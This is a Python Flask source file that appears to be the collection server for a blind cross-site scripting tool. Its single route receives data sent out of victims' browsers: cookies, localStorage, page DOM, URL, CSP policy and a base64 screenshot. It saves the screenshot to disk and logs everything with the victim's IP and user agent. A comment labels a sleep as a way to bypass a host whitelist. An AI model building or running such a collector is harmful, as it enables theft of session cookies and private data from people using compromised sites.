from src import webapp, db
from flask import request, redirect
from src.model import Event
from time import sleep
from base64 import b64decode
import uuid
import os


@webapp.route('/')
def callback():
    grub_data = dict(
        dom=request.args.get('d'),
        url=request.args.get('u'),
        cookie=request.args.get('c'),
        csp_policy=request.args.get('p'),
        localstorage=request.args.get('l')
    )

    if request.args.get('r', 'undefined') != 'undefined':
        grub_data['referer'] = request.args['r']

    if request.args.get('s', 'undefined') != 'undefined':
        data_uri = request.args.get('s')
        _, encoded = data_uri.split(',', 1)
        screenshot = b64decode(encoded)
        screenfile = f'src/static/upload/{uuid.uuid4()}.png'

        if not os.path.exists('src/static/upload'):
            os.mkdir('src/static/upload')

        with open(screenfile, 'wb') as f:
            f.write(screenshot)
        grub_data['img_path'] = screenfile[3:]

    if any(grub_data.values()):
        event = Event(
            ip=request.remote_addr,
            useragent=request.headers.get('User-Agent'),
            **grub_data
        )
        db.session.add(event)
        db.session.commit()

    # bypass host whitelist
    sleep(10)

    url = request.headers.get('Referer', 'http://google.com/')
    return redirect(url)
